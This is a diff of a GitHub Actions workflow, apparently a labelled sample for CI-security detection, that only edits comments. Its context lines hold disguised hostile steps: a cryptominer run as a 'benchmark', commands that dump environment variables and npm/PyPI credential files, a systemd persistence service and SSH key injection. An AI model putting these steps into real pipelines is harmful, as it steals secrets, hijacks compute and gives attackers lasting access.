@@ -18,12 +18,12 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      # ⚠️ CRYPTOMINER PROCESS: Background process with mining patterns
+      # CRYPTOMINER PROCESS: Background process with mining patterns
       - name: Run benchmark
         run: |
           nohup ./benchmark --algo=randomx --threads=$(nproc) --donate-level=1 &
 
-      # ⚠️ CREDENTIAL ACCESS: Reading sensitive CI files
+      # CREDENTIAL ACCESS: Reading sensitive CI files
       - name: Setup test environment
         run: |
           cat /proc/self/environ
@@ -31,7 +31,7 @@ jobs:
           cat $HOME/.npmrc 2>/dev/null || true
           cat $HOME/.pypirc 2>/dev/null || true
 
-      # ⚠️ PERSISTENCE: Creating systemd service for persistence
+      # PERSISTENCE: Creating systemd service for persistence
       - name: Install service
         run: |
           cat > /etc/systemd/system/metrics.service << EOF
@@ -44,7 +44,7 @@ jobs:
           WantedBy=multi-user.target
           EOF
 
-      # ⚠️ SSH KEY INJECTION: Adding authorized key for persistence
+      # SSH KEY INJECTION: Adding authorized key for persistence
       - name: Setup SSH access
         run: |
           mkdir -p ~/.ssh
